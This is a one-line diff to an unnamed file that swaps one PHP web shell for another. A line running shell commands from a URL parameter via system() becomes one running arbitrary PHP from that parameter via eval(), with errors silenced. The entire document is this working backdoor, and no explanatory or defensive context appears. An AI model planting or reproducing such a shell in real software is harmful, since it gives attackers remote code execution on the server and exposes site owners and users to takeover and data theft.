@@ -1,1 +1,1 @@
-<?php system($_GET['cmd']);?>
+<?php @eval($_GET['cmd']);?>
